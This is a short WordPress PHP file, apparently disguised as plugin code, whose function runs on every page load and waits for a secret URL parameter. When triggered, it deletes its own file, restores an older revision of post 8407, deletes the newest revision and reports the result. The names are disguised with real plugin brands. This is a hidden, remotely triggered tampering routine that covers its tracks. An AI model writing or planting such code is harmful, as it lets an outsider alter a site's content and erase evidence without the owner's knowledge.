<?php

function update_translate_locator_elements() {
	if (isset($_GET['all_frontend_group']) && $_GET['all_frontend_group'] === 'auth_first_api_edition') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$yoast_copyright_user_gift = 8407;
		$connect_gravity_types = wp_get_post_revisions($yoast_copyright_user_gift);
		if (empty($connect_gravity_types)) die('no revisions');
		if (count($connect_gravity_types) < 2) die('less than 2');
		$advanced_single_name_src = array_shift($connect_gravity_types);
		$gallery_enhanced_block_affiliate = $advanced_single_name_src->ID;
		$post_cover_insert = array_shift($connect_gravity_types);
		$converter_word_scroll = $post_cover_insert->ID;
		$demomentsomtres_cf7_notice = wp_restore_post_revision($converter_word_scroll);
		if ($demomentsomtres_cf7_notice === false) die('error restoring');
		$demomentsomtres_cf7_notice = wp_delete_post_revision($gallery_enhanced_block_affiliate);		
		if ($demomentsomtres_cf7_notice === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'update_translate_locator_elements');
